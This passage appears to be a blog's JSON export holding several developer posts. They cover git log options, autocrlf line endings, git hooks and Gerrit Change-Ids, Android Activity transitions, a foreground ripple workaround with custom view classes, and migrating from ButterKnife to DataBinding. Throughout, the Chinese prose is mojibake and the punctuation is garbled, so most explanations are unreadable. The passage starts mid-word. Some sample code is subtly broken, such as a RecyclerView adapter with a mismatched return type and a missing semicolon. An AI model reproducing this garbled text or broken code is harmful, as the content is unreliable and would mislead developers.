ä¸ªæ–‡ä»¶ç›¸å…³çš„æ“ä½œè®°å½•git log -Sâ€Hello, World!â€ ##è¿™ä¸ªç­‰äºæŸ¥æ‰¾git log -pé‡Œé¢å“ªä¸€æ¬¡æäº¤æ·»åŠ äº†â€œHello, Worldï¼â€è¿™å¥è¯git log â€“no-mergesgit log â€“mergesgit log â€“pretty=format:â€%h%x09%an%x09%ad%x09%sâ€ //éå¸¸ç®€æ˜çš„ä¸€è¡Œæ˜¾ç¤º 18. autocrlfçš„æ¦‚å¿µwarning: LF will be replaced by CRLF in XXXXX. è¿™ä¸ªä¸»è¦æ˜¯é’ˆå¯¹windowsç”¨æˆ·æ¥è®²çš„ã€‚ git config settings can be overridden by gitattributes settings. æ‰€ä»¥åœ¨å½“å‰é¡¹ç›®ä¸­åˆ›å»ºä¸€ä¸ªgitattributesæ–‡ä»¶å°±æ˜¯ä¸ºäº†è¦†ç›–ç³»ç»Ÿé¢„è®¾git é…ç½® Moral (for Windows): use core.autocrlf = true if you plan to use this project under Unix as well (and unwilling to configure your editor/IDE to use unix line endings), use core.autocrlf = false if you plan to use this project under Windows only (or you have configured your editor/IDE to use unix line endings), never use core.autocrlf = input unless you have a good reason to (eg if youâ€™re using unix utilities under windows or if you run into makefiles issues) autocrlfå°±æ˜¯å¯¹äºä¸€ä¸ªå¯èƒ½åŒæ—¶åœ¨unix(æ¢è¡Œç¬¦æ˜¯lf)å’Œwindows(æ¢è¡Œç¬¦æ˜¯crlf)ä¸Šè¢«ä¿®æ”¹çš„æ–‡æœ¬æ–‡ä»¶ï¼Œå¦‚æœæ˜¯åœ¨windowsä¸Šåˆ›å»ºï¼› ä¸€ä¸ªæ–°çš„æ–‡ä»¶(é‚£ä¹ˆæ¢è¡Œç¬¦è‚¯å®šæ˜¯crlfï¼Œåœ¨commitçš„æ—¶å€™gitä¼šå°†æ‰€æœ‰crlfçš„æ¢è¡Œç¬¦æ¢æˆlf,ä½†æ˜¯å¯¹äºæ‰€æœ‰çš„å·²æœ‰æ–‡ä»¶ï¼Œä¸ä¼šæœ‰å½±å“ï¼Œè¿œç¨‹gitä»“åº“ä¸­çš„crlfè¿˜æ˜¯crlf)ã€‚ The warning â€œLF will be replaced by CRLFâ€ says that you (having autocrlf=true) will lose your unix-style LF after commit-checkout cycle (it will be replaced by windows-style CRLF). Git doesnâ€™t expect you to use unix-style LF under windows. The warning â€œCRLF will be replaced by LFâ€ says that you (having autocrlf=input) will lose your windows-style CRLF after a commit-checkout cycle (it will be replaced by unix-style LF). Donâ€™t use input under windows. å¯¹äºwindowsç”¨æˆ·æ¥è®²ï¼šgit config â€“global core.autocrlf true //å…¨å±€è®¾ç½®(å¸Œæœ›ä½¿ç”¨windowsçš„æ¢è¡Œç¬¦)git config â€“local core.autocrlf input //å•ä¸ªé¡¹ç›®è®¾ç½®(å¸Œæœ›ä½¿ç”¨unixçš„æ¢è¡Œç¬¦) æ‰€ä»¥è¿™äº‹è¦çœ‹è‡ªå·±åˆ°åº•å¸Œæœ›ä½¿ç”¨å“ªç§æ¢è¡Œç¬¦å¯¹äºå·²ç»å‡ºç°è¿™ç§é”™è¯¯çš„é¡¹ç›®ï¼Œgit rm -r â€“cached . &amp;&amp; git add . &amp;&amp; git commit -m â€œfix crlfâ€ 19. git hooksçš„æ¦‚å¿µåœ¨æ¯ä¸€ä¸ªgitä»“åº“çš„.gitæ–‡ä»¶å¤¹ä¸‹æœ‰ä¸€ä¸ªhooksæ–‡ä»¶å¤¹ï¼Œä¸‹é¢æœ‰ä¸€äº›commit-msg.sampleï¼Œpre-commit.sampleç­‰æ–‡ä»¶å¤¹ã€‚é»˜è®¤æƒ…å†µä¸‹è¿™äº›.sampleæ–‡ä»¶æ˜¯ä¸ä¼šæ‰§è¡Œçš„ï¼Œå»æ‰åé¢çš„.sampleåç¼€ã€‚ä¹Ÿå¾ˆå¥½ç†è§£ï¼Œpre-commitä»£è¡¨ç”¨æˆ·æœ¬åœ°è¿›è¡Œgit commitçš„æ—¶å€™ä¼šæ‰§è¡Œçš„ä¸€ä¸ªè„šæœ¬ï¼Œå°±è·Ÿå†™shellè„šæœ¬ä¸€æ ·çš„ã€‚æœ¬åœ°æœ€åä¸€æ¬¡commit messageå®é™…ä¸Šè¢«å†™è¿›äº† .git/COMMIT_EDITMSG è¿™ä¸ªæ–‡ä»¶ã€‚gerrit çš„ Change-Id æœºåˆ¶å°±æ˜¯ä¿®æ”¹äº†è¿™ä¸ªæ–‡ä»¶ï¼Œå¾€è¿™é‡Œå¤´å¡äº†ä¸€è¡Œ: Change-Id: Ic89d5ce6ce4de70d1dcb315ce543c86a2b3ac003 è¿™æ ·çš„æ–‡å­—ã€‚ Change-Id æ˜¯ gerrit (ä»£ç å®¡æ ¸å¹³å°)çš„æ¦‚å¿µ, ä¸ git (ç‰ˆæœ¬ç®¡ç†) æ˜¯æ²¡æœ‰å…³ç³»çš„ commit-msgæ–‡ä»¶çš„å†…å®¹ æ‰€ä»¥ä»£ç ä¸€èˆ¬æ˜¯è¿™ä¹ˆæäº¤çš„ $ git add ...... $ git commit -m &quot;ä½ çš„æäº¤æ—¥å¿—&quot; $ git push origin HEAD:refs/for/master å‚è€ƒ git resetå’Œrevert git recipes git merge â€“no-ff advanced git techniques","tags":[{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"},{"name":"git","slug":"git","permalink":"https://haldir65.github.io/tags/git/"}]},{"title":"activity transition pre and post lollipop","date":"2016-09-27T14:53:25.000Z","path":"2016/09/27/2016-09-27-activity-transition-pre-and-post-lollipop/","text":"Lollipopå¼€å§‹å¼•å…¥äº†æ–°çš„Activity TransitionåŠ¨ç”»æ•ˆæœï¼Œæ¯”èµ·å¸¸ç”¨çš„overridePendingTransaction() æ•ˆæœè¦å¼ºå¤§è®¸å¤š æµ‹è¯•ç¯å¢ƒsupportLibVersion = â€œ24.2.1â€gradle plugin version : â€œclasspath â€˜com.android.tools.build:gradle:2.2.0â€™â€gradle version : 3.1compileSdkVersion 24buildToolsVersion â€œ24.0.2â€ å¸¸è§„ç”¨æ³•: A activity &gt;&gt;&gt;&gt; B activity A activityä¸­: intent = new Intent(getActivity(), PictureDetailSubActivity2.class); intent.putExtra(EXTRA_IMAGE_URL, R.drawable.b2); intent.putExtra(EXTRA_IMAGE_TITLE, &quot;ä½¿ç”¨ActivityCompatåŠ¨ç”»&quot;); ActivityOptionsCompat optionsCompat = ActivityOptionsCompat. makeSceneTransitionAnimation(getActivity(), view, TRANSIT_PIC); try { ActivityCompat.startActivity(getActivity(), intent, optionsCompat.toBundle()); //æ®è¯´éƒ¨åˆ†ä¸‰æ˜Ÿæ‰‹æœºä¸Šä¼šå¤±æ•ˆ } catch (Exception e) { e.printStackTrace(); ToastUtils.showTextShort(getActivity(), &quot;ActivityCompatå‡ºé”™ï¼ï¼&quot;); startActivity(intent); } Pairè¿™ä¸ªclassæ˜¯v4åŒ…é‡Œçš„ä¸€ä¸ªUtilç±»ï¼Œç”¨æ¥è£…è½½ä¸€ç»„(pair)å¯¹è±¡ï¼Œæ”¯æŒæ³›å‹ï¼Œå¾ˆå¥½ç”¨ã€‚ç”±äºéƒ½æ˜¯v4åŒ…é‡Œçš„æ–¹æ³•ï¼Œçœå»äº†åšAPIç‰ˆæœ¬åˆ¤æ–­ï¼Œåœ¨API 16ä»¥ä¸‹ï¼Œå°±åªä¼šè°ƒç”¨æ™®é€šçš„startActivityæ–¹æ³•ã€‚ä¸Šé¢åŠ äº†try catchæ˜¯é¿å…éƒ¨åˆ†æ‰‹æœºä¸Šå‡ºç°é—®é¢˜ B activityä¸­onCreateè°ƒç”¨ ViewCompat.setTransitionName(binding.imageDetail, TRANSIT_PIC); å°±å¯å®ç°æ™®é€šçš„è½¬åœºåŠ¨ç”»ã€‚ å…¼å®¹æ–¹å¼(å°†è¿ç»­çš„Transitionå¸¦åˆ°API16ä»¥ä¸‹) ä¸»è¦çš„åŸç†: åœ¨A activityä¸­è®°å½•è¦å¸¦åˆ°B activityä¸­çš„Viewçš„å½“å‰ä½ç½®ï¼Œåœ¨B activityä¸­æ·»åŠ onPredrawListener(measureå®Œæ¯•ï¼Œlayoutå®Œæ¯•ï¼Œå³å°†å¼€å§‹Drawçš„æ—¶å€™)ï¼Œæ­¤æ—¶å¼€å§‹è¿›è¡ŒåŠ¨ç”»ï¼Œå°†SharedViewä»åŸä½ç½®animateåˆ°B Activtyä¸­çš„ä½ç½® åŸç†åŠè¯¦ç»†ä»£ç åœ¨è¿™é‡Œ: Dev Bytes Activity Animations Youtube æˆ‘ç…§ç€å†™äº†ä¸€äº›å…³äºActivity Transitionçš„æ¨¡æ¿ï¼ŒgitHub åŸºæœ¬èƒ½å®ç°å…¼å®¹åˆ°API 16ä»¥ä¸‹çš„æ•ˆæœ æœ€åæ˜¯è¿™å‡ å¤©é‡åˆ°çš„å¤©å‘ @Override public void onCreate(Bundle savedInstanceState, PersistableBundle persistentState) { super.onCreate(savedInstanceState, persistentState); } è¿™æ ·çš„Activityç»å¯¹ä¼šå‡ºClassNotFoundException , è€Œä¸”å¹¶ä¸ä¼šä¸»åŠ¨å‡ºç°åœ¨logcatä¸­ overridePendingTransactionè¦åœ¨startActivityä»¥åŠfinishä¹‹åæ‰èƒ½è°ƒç”¨ gitHubä¸Šæœ‰ä¸€ä¸ªæ¯”è¾ƒå¥½çš„å…¼å®¹åº“ï¼Œå¤§è‡´åŸç†ä¹Ÿæ˜¯ä½¿ç”¨onPreDrawListener","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"transition","slug":"transition","permalink":"https://haldir65.github.io/tags/transition/"}]},{"title":"androidä½¿ç”¨selectableItemBackgroundçš„ä¸€äº›å‘","date":"2016-09-23T19:56:39.000Z","path":"2016/09/23/2016-09-23-selectableItemBackground-foreground/","text":"android:foreground=â€?android:attr/selectableItemBackgroundâ€ æˆ–æ˜¯ android:background=â€?android:attr/selectableItemBackgroundâ€ è¿™ä¸ªxmlå±æ€§æœ€æ—©æ˜¯æˆ‘å­¦ç€å†™recyclerVeiwçš„item xmlçš„æ—¶å€™æ¥è§¦åˆ°çš„ï¼Œç®€å•æ¥è¯´å°±æ˜¯ï¼Œåœ¨API 21åŠä»¥ä¸Šï¼Œç”¨æˆ·ç‚¹å‡»è¿™ä¸ªitemViewæ—¶å€™ä¼šå‡ºç°ä¸€ä¸ªRippleæ•ˆæœéå¸¸å¥½çœ‹ï¼Œè€Œåœ¨API 21ä»¥ä¸‹åˆ™ä¼šè¡¨ç°ä¸ºMonoChromeçš„ç±»ä¼¼æŒ‰å‹è‰²çš„æ•ˆæœ è€Œè¿™ä¸ªç‚¹å‡»æ—¶çš„æ°´æ³¢çº¹é¢œè‰²ä¹Ÿæ˜¯å¯ä»¥Customizeçš„ &lt;item name=&quot;android:colorControlHighlight&quot;&gt;@color/my_ripple_color&lt;/item&gt; //è¿™ä¸ªè¦å†™åœ¨è‡ªå·±çš„Activityçš„Theme(style-v21)é‡Œï¼Œæ³¨æ„ï¼Œå½“å‰Activityçš„Themeå¿…é¡»ç»§æ‰¿è‡ªAppcompat!!äºæ˜¯ï¼Œæˆ‘å†™äº†è¿™æ ·çš„xml &lt;LinearLayout android:id=&quot;@+id/item_root&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;?android:attr/listPreferredItemHeight&quot; android:orientation=&quot;vertical&quot; android:gravity=&quot;center&quot; android:onClick=&quot;@{(view) -&gt; callback.onClick(view,data)}&quot; android:elevation=&quot;2dp&quot; android:background=&quot;@color/md_amber_200&quot; android:foreground=&quot;?android:attr/selectableItemBackground&quot; /&gt; ç„¶è€Œï¼Œç‚¹å‡»ä¹‹åå¹¶æ²¡æœ‰å‡ºç°æ°´æ³¢çº¹(æ¨¡æ‹Ÿå™¨ API 21)ï¼Œæ¢æˆCardViewæˆ–æ˜¯å°†foregroundæ”¹ä¸ºbackgroundä¹‹åæ‰æœ‰æ•ˆã€‚æŸ¥äº†å¾ˆå¤šåšå®¢ï¼Œæœ€åå¾—å‡ºç»“è®º:android:foregroundåœ¨API 23ä¹‹å‰åªå¯¹FrameLayoutæœ‰æ•ˆ(CardViewç»§æ‰¿è‡ªFrameLayoutå½“ç„¶æœ‰æ•ˆ)ã€‚ ##æ‰€ä»¥æ­£ç¡®çš„åšæ³•æ˜¯ android:foreground=â€?android:attr/selectableItemBackgroundâ€ æ”¹ä¸º android:background=â€?android:attr/selectableItemBackgroundâ€ æˆ–è€…ä½¿ç”¨FrameLayoutã€‚ å…³äºforegroundä¹‹å‰çœ‹google io2016æ—¶ï¼ŒChris Banesç»™äº†è¿™æ ·çš„è§£é‡Šã€‚,android:foregroundåœ¨API 1 çš„FrameLayoutä¸­å°±æœ‰äº†ï¼Œä½†ç›´åˆ°API 23æ‰å°†è¿™ä¸ªå±æ€§æ·»åŠ åˆ°Viewä¸­ã€‚æ‰€ä»¥ï¼Œæ¢æˆAPI 23çš„æ‰‹æœºä¸Šé¢é‚£æ®µä»£ç foregroundä¹Ÿæ˜¯å¯ä»¥å‡ºç°Rippleçš„,è‡³äº23ä¹‹å‰ä¸ºä»€ä¹ˆforegroundæ— æ•ˆï¼Œå¹¶ä¸æ¸…æ¥šä¸ºä»€ä¹ˆ é¦–å…ˆæ˜¯ä¸€ç§ç®€å•çš„æ¨¡æ‹Ÿè¿™ç§è§†è§‰æ•ˆæœçš„å°è¯•ï¼šå¦‚ä½•åˆ›å»ºå…¼å®¹çš„Forefround drawable selector è¿™ç¯‡æ–‡ç« æåˆ°äº†: ç®€å•æ¥è®²ï¼ŒForeground å®šä¹‰äº†ç»˜åˆ¶äºå½“å‰å†…å®¹ä¹‹ä¸Šçš„ Drawableï¼Œç±»ä¼¼ä¸€å±‚è¦†ç›–ç‰©ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¸ºè®¾ç½® Foreground çš„å€¼ä¸º drawableæˆ–è€…colorï¼Œ é‚£å¦‚æœå°† Froeground è®¾ç½®ä¸º drawable selectorï¼Œè‡ªç„¶å°±å¯ä»¥ä¸ºæ§ä»¶å®ç°ç‚¹å‡»å“åº”æ•ˆæœäº†ã€‚ æ¯”è¾ƒå¥‡æ€ªçš„æ˜¯åœ¨ sdk 23 ä»¥å‰ï¼Œforegrond å±æ€§åªå¯¹ Framelayout ç”Ÿæ•ˆï¼Œä½†è¿™ä¸ªé—®é¢˜ç°åœ¨å¾—åˆ°äº†è§£å†³ï¼Œæ‰€ä»¥ä¹Ÿè¯·ç¡®ä¿ä½ çš„ compileSdkVersion å¤§äºç­‰äº23 è¿™ç¯‡æ–‡ç« çš„åšæ³•æ˜¯é’ˆå¯¹21ä»¥ä¸‹çš„ç‰ˆæœ¬ä½¿ç”¨slelector Drawableå®ç°ç±»ä¼¼çš„æ•ˆæœ å¦‚ä½•çœŸæ­£å®ç°ä¸ºAPI23ä¹‹å‰çš„View,ViewGroupæ·»åŠ foreground?éšåæˆ‘æ‰¾åˆ°äº†è¿™ç¯‡åšå®¢ï¼Œå…·ä½“çš„é€»è¾‘å¹¶ä¸å¤ªå¤šã€‚è¿™é‡Œæ’ä¸€å¥ï¼Œä»»ä½•Drawableå¯¹è±¡ï¼Œåœ¨ä½ è°ƒç”¨setDrawableä¹‹åï¼Œè¯¥Drawableéƒ½ä¼šä¿ç•™ä¸€ä¸ªæœ€åä¸€ä¸ªè°ƒç”¨å¯¹è±¡çš„callback Drawable-&gt;View-&gt;Context //leak!//æ‰€ä»¥Drawableä¹Ÿæœ‰å¯èƒ½å¯¼è‡´Activity leak éšåæˆ‘å‘ç°äº†æ›´å¤šæœ‰æ„æ€çš„è®¨è®ºé¦–å…ˆæ˜¯Chris Banesåœ¨G+ä¸Šçš„Post : Foreground Dogeä»–ç»™å‡ºäº†ä¸¤ç§æ–¹æ¡ˆ,Chrisä½œä¸ºGoogleå‘˜å·¥ï¼Œç»™å‡ºçš„è§£å†³æ–¹æ¡ˆåº”è¯¥æ˜¯æ¯”è¾ƒå®˜æ–¹çš„äº† å¦‚æœæƒ³åˆ©ç”¨FrameLayoutçš„foregroundç‰¹æ€§æ¥å®ç°ç‚¹å‡»ç‰¹æ•ˆçš„è¯ï¼Œå®Œå…¨å¯ä»¥åœ¨è‡ªå·±çš„xmlå¤–é¢å†åŒ…è£¹ä¸€å±‚FrameLayout è‡ªå·±åŠ¨æ‰‹å†™ä¸€ä¸ªå®ç°foregroundçš„Viewgroup , ä»£ç  attrs:`&lt;?xml version=â€1.0â€ encoding=â€utf-8â€?&gt; &lt;attr name=&quot;android:foreground&quot; /&gt; &lt;attr name=&quot;android:foregroundInsidePadding&quot; /&gt; &lt;attr name=&quot;android:foregroundGravity&quot; /&gt; ` package your.package; import android.content.Context; import android.content.res.TypedArray; import android.graphics.Canvas; import android.graphics.Rect; import android.graphics.drawable.Drawable; import android.util.AttributeSet; import android.view.Gravity; import android.widget.LinearLayout; import your.package.R; public class ForegroundLinearLayout extends LinearLayout { private Drawable mForeground; private final Rect mSelfBounds = new Rect(); private final Rect mOverlayBounds = new Rect(); private int mForegroundGravity = Gravity.FILL; protected boolean mForegroundInPadding = true; boolean mForegroundBoundsChanged = false; public ForegroundLinearLayout(Context context) { super(context); } public ForegroundLinearLayout(Context context, AttributeSet attrs) { this(context, attrs, 0); } public ForegroundLinearLayout(Context context, AttributeSet attrs, int defStyle) { super(context, attrs, defStyle); TypedArray a = context.obtainStyledAttributes(attrs, R.styleable.ForegroundLinearLayout, defStyle, 0); mForegroundGravity = a.getInt( R.styleable.ForegroundLinearLayout_android_foregroundGravity, mForegroundGravity); final Drawable d = a.getDrawable(R.styleable.ForegroundLinearLayout_android_foreground); if (d != null) { setForeground(d); } mForegroundInPadding = a.getBoolean( R.styleable.ForegroundLinearLayout_android_foregroundInsidePadding, true); a.recycle(); } /** * Describes how the foreground is positioned. * * @return foreground gravity. * * @see #setForegroundGravity(int) */ public int getForegroundGravity() { return mForegroundGravity; } /** * Describes how the foreground is positioned. Defaults to START and TOP. * * @param foregroundGravity See {@link android.view.Gravity} * * @see #getForegroundGravity() */ public void setForegroundGravity(int foregroundGravity) { if (mForegroundGravity != foregroundGravity) { if ((foregroundGravity &amp; Gravity.RELATIVE_HORIZONTAL_GRAVITY_MASK) == 0) { foregroundGravity |= Gravity.START; } if ((foregroundGravity &amp; Gravity.VERTICAL_GRAVITY_MASK) == 0) { foregroundGravity |= Gravity.TOP; } mForegroundGravity = foregroundGravity; if (mForegroundGravity == Gravity.FILL &amp;&amp; mForeground != null) { Rect padding = new Rect(); mForeground.getPadding(padding); } requestLayout(); } } @Override protected boolean verifyDrawable(Drawable who) { return super.verifyDrawable(who) || (who == mForeground); } @Override public void jumpDrawablesToCurrentState() { super.jumpDrawablesToCurrentState(); if (mForeground != null) mForeground.jumpToCurrentState(); } @Override protected void drawableStateChanged() { super.drawableStateChanged(); if (mForeground != null &amp;&amp; mForeground.isStateful()) { mForeground.setState(getDrawableState()); } } /** * Supply a Drawable that is to be rendered on top of all of the child * views in the frame layout. Any padding in the Drawable will be taken * into account by ensuring that the children are inset to be placed * inside of the padding area. * * @param drawable The Drawable to be drawn on top of the children. */ public void setForeground(Drawable drawable) { if (mForeground != drawable) { if (mForeground != null) { mForeground.setCallback(null); unscheduleDrawable(mForeground); } mForeground = drawable; if (drawable != null) { setWillNotDraw(false); drawable.setCallback(this); if (drawable.isStateful()) { drawable.setState(getDrawableState()); } if (mForegroundGravity == Gravity.FILL) { Rect padding = new Rect(); drawable.getPadding(padding); } } else { setWillNotDraw(true); } requestLayout(); invalidate(); } } /** * Returns the drawable used as the foreground of this FrameLayout. The * foreground drawable, if non-null, is always drawn on top of the children. * * @return A Drawable or null if no foreground was set. */ public Drawable getForeground() { return mForeground; } @Override protected void onLayout(boolean changed, int left, int top, int right, int bottom) { super.onLayout(changed, left, top, right, bottom); mForegroundBoundsChanged = changed; } @Override protected void onSizeChanged(int w, int h, int oldw, int oldh) { super.onSizeChanged(w, h, oldw, oldh); mForegroundBoundsChanged = true; } @Override public void draw(Canvas canvas) { super.draw(canvas); if (mForeground != null) { final Drawable foreground = mForeground; if (mForegroundBoundsChanged) { mForegroundBoundsChanged = false; final Rect selfBounds = mSelfBounds; final Rect overlayBounds = mOverlayBounds; final int w = getRight() - getLeft(); final int h = getBottom() - getTop(); if (mForegroundInPadding) { selfBounds.set(0, 0, w, h); } else { selfBounds.set(getPaddingLeft(), getPaddingTop(), w - getPaddingRight(), h - getPaddingBottom()); } Gravity.apply(mForegroundGravity, foreground.getIntrinsicWidth(), foreground.getIntrinsicHeight(), selfBounds, overlayBounds); foreground.setBounds(overlayBounds); } foreground.draw(canvas); } } } ä½¿ç”¨æ–¹å¼ &lt;your.package.ForegroundLinearLayout android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:foreground=&quot;?android:selectableItemBackground&quot;&gt; &lt;ImageView android:id=â€@+id/imageview_opaqueâ€ android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; /&gt; ... other views ... /&gt; æ¥ç€æ˜¯Jack Whartonçš„ForegroundImageView attrs &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;resources&gt; &lt;declare-styleable name=&quot;ForegroundImageView&quot;&gt; &lt;attr name=&quot;android:foreground&quot;/&gt; &lt;/declare-styleable&gt; &lt;/resources&gt; import android.content.Context; import android.content.res.TypedArray; import android.graphics.Canvas; import android.graphics.drawable.Drawable; import android.util.AttributeSet; import android.widget.ImageView; public class ForegroundImageView extends ImageView { private Drawable foreground; public ForegroundImageView(Context context) { this(context, null); } public ForegroundImageView(Context context, AttributeSet attrs) { super(context, attrs); TypedArray a = context.obtainStyledAttributes(attrs, R.styleable.ForegroundImageView); Drawable foreground = a.getDrawable(R.styleable.ForegroundImageView_android_foreground); if (foreground != null) { setForeground(foreground); } a.recycle(); } /** * Supply a drawable resource that is to be rendered on top of all of the child * views in the frame layout. * * @param drawableResId The drawable resource to be drawn on top of the children. */ public void setForegroundResource(int drawableResId) { setForeground(getContext().getResources().getDrawable(drawableResId)); } /** * Supply a Drawable that is to be rendered on top of all of the child * views in the frame layout. * * @param drawable The Drawable to be drawn on top of the children. */ public void setForeground(Drawable drawable) { if (foreground == drawable) { return; } if (foreground != null) { foreground.setCallback(null); unscheduleDrawable(foreground); } foreground = drawable; if (drawable != null) { drawable.setCallback(this); if (drawable.isStateful()) { drawable.setState(getDrawableState()); } } requestLayout(); invalidate(); } @Override protected boolean verifyDrawable(Drawable who) { return super.verifyDrawable(who) || who == foreground; } @Override public void jumpDrawablesToCurrentState() { super.jumpDrawablesToCurrentState(); if (foreground != null) foreground.jumpToCurrentState(); } @Override protected void drawableStateChanged() { super.drawableStateChanged(); if (foreground != null &amp;&amp; foreground.isStateful()) { foreground.setState(getDrawableState()); } } @Override protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) { super.onMeasure(widthMeasureSpec, heightMeasureSpec); if (foreground != null) { foreground.setBounds(0, 0, getMeasuredWidth(), getMeasuredHeight()); invalidate(); } } @Override protected void onSizeChanged(int w, int h, int oldw, int oldh) { super.onSizeChanged(w, h, oldw, oldh); if (foreground != null) { foreground.setBounds(0, 0, w, h); invalidate(); } } @Override public void draw(Canvas canvas) { super.draw(canvas); if (foreground != null) { foreground.draw(canvas); } } } æœ€åï¼Œè¿˜æœ‰äººç»™å‡ºæ®è¯´æ›´å¥½çš„è§£å†³æ–¹æ¡ˆæ²¡æœ‰æµ‹è¯•è¿‡ï¼Œä¸äº†è§£ reference Android themes and styles demisfied å…³äºThemeå’ŒStyleçš„åŒºåˆ«çš„å¾ˆå¥½çš„å­¦ä¹ èµ„æ–™ Chris Banes G+ post è¯„è®ºå¾ˆç²¾å½© RelativeLayout with foreGround æ²¡æµ‹è¯•è¿‡ Ripple Effect å°†Rippleçš„åŠ¨ç”»å…¼å®¹åˆ°API 9+ ï¼Œå¾ˆå‡ºè‰²çš„ä¸€ä¸ªåº“ã€‚ä¹‹å‰é¡¹ç›®ä¸­ç”¨è¿‡ï¼Œå°±æ˜¯ä¸€ä¸ªç»§æ‰¿è‡ªRelativeLayoutçš„è‡ªå®šä¹‰ViewGroupã€‚","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"foreground","slug":"foreground","permalink":"https://haldir65.github.io/tags/foreground/"}]},{"title":"replace butterKnife with databinding","date":"2016-09-22T15:17:39.000Z","path":"2016/09/22/2016-09-22-replace-butterKnife-with-databinding/","text":"Yigit Boyar åœ¨2015å¹´çš„android Dev summitä¸Šä»‹ç»äº†Databindingï¼Œå½“æ—¶å¥½åƒæåˆ°ä¸€å¥:â€œno binding libraries will be created from now on â€œï¼Œå¤§æ„å¦‚æ­¤ã€‚æœ¬æ–‡ä»‹ç»ä½¿ç”¨Databindingæ›¿ä»£ButterKnifeçš„ç”¨æ³• æœ¬æ–‡å¤§éƒ¨åˆ†ä»£ç æ¥è‡ªç½‘ç»œï¼Œæˆ‘åªæ˜¯è§‰å¾—ç®€å•çš„ä»£ç ç›´æ¥å¤åˆ¶ç²˜è´´å¯èƒ½ä¼šæ¯”è¾ƒå¥½ã€‚ 1.åœ¨Activityä¸­ä½¿ç”¨before class ExampleActivity extends Activity { @Bind(R.id.title) TextView title; @Bind(R.id.subtitle) TextView subtitle; @Bind(R.id.footer) TextView footer; @Override public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.simple_activity); ButterKnife.bind(this); } } afteré¦–å…ˆéœ€è¦å°†xmlæ–‡ä»¶æ·»åŠ  Layout tagR.layout.smple_activity &lt;layout&gt; &lt;LinearLayout&gt; &lt;TextView android:id=&quot;@+id/title&quot;&gt; &lt;TextView android:id=&quot;@+id/subtitle&quot;&gt; &lt;TextView android:id=&quot;@+id/footer&quot;&gt; &lt;/LinearLayout&gt; &lt;/layout&gt; class ExampleActivity extends Activity { private ActivitySampleBinding binding; @Override public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = DataBindingUtils.setContentView(this, R.layout.simple_activity); binding.title.setText(&quot;I am Title&quot;); //no more findViewById!!! } } 2.åœ¨Fragmentä¸­ä½¿ç”¨before public class FancyFragment extends Fragment { @Bind(R.id.button1) Button button1; @Bind(R.id.button2) Button button2; @Override public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) { View view = inflater.inflate(R.layout.fancy_fragment, container, false); ButterKnife.bind(this, view); // TODO Use fields... return view; } } after public class FancyFragment extends Fragment { private FragmentFancyBinding binding; @Override public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) { binding = DataBindingUtil.inflate(inflater,R.layout.fragment_fancy, container, false); return binding.getRoot(); } } 3.åœ¨ViewHolderä¸­ä½¿ç”¨before public class MyAdapter extends BaseAdapter { @Override public View getView(int position, View view, ViewGroup parent) { ViewHolder holder; if (view != null) { holder = (ViewHolder) view.getTag(); } else { view = inflater.inflate(R.layout.list_item_sample, parent, false); holder = new ViewHolder(view); view.setTag(holder); } holder.name.setText(&quot;John Doe&quot;); // etc... return view; } static class ViewHolder { @Bind(R.id.title) TextView name; @Bind(R.id.job_title) TextView jobTitle; public ViewHolder(View view) { ButterKnife.bind(this, view); } } } after ListViewpublic class MyAdapter extends BaseAdapter { @Override public View getView(int position, View convertView, ViewGroup parent) { ListItemSampleBinding binding; if (convertView == null) { binding = DataBindingUtil.inflate(inflater, R.layout.list_item_sample, parent, false); convertView = binding.getRoot(); convertView.setTag(binding); } else { binding = (ListItemSampleBinding) convertView.getTag(); } binding.setUser(getItem(position)); // binding.name.setText(&quot;John Doe&quot;); return convertView; } } recyclerViewpublic class SampleRecyclerAdapter extends RecyclerView.Adapter&lt;SampleRecyclerAdapter.BindingHolder&gt; { @Override public RegisterableDeviceListAdapter.ViewHolder onCreateViewHolder(ViewGroup parent, int viewType) { final View v = LayoutInflater.from(parent.getContext()).inflate(R.layout.list_item_sample, parent, false); return new BindingHolder(v); } @Override public void onBindViewHolder(BindingHolder holder, int position) { holder.getBinding().setVariable(BR.user, getItem(position)); } static class BindingHolder extends RecyclerView.ViewHolder { private final ViewDataBinding binding; public BindingHolder(View itemView) { super(itemView); binding = DataBindingUtil.bind(itemView) } public ViewDataBinding getBinding() { return binding; } } } 4.åœ¨CustomViewä¸­ä½¿ç”¨åœ¨è‡ªå®šä¹‰View(ViewGroup)çš„æ—¶å€™ï¼Œå¯ä»¥ç”¨ButterKnifeå‡å°‘è‡ªå®šä¹‰ViewGroupä¸­çš„findViewById,ä½¿ç”¨Databindingä¹‹åæ˜¯è¿™æ ·çš„ã€‚ public class Pagination extends RelativeLayout { private ViewPaginationBinding binding; public Pagination(Context context) { this(context, null); } public Pagination(Context context, AttributeSet attrs) { super(context, attrs); binding = DataBindingUtil.inflate(LayoutInflater.from(context), R.layout.view_pagination, this, true); } public static void setListener(Pagination paginate, View target, OnPaginationClickListener listener) { if (listener != null) { target.setOnClickListener(_v -&gt; listener.onClick(paginate)); } } @BindingAdapter({&quot;android:onPrevButtonClicked&quot;}) public static void setPrevClickListener(Pagination view, OnPaginationClickListener listener) { setListener(view, view.binding.btnPrevPage, listener); } @BindingAdapter({&quot;android:onNextButtonClicked&quot;}) public static void setNextClickListener(Pagination view, OnPaginationClickListener listener) { setListener(view, view.binding.btnNextPage, listener); } public interface OnPaginationClickListener { void onClick(Pagination pagination); } } 5.EventHandler, 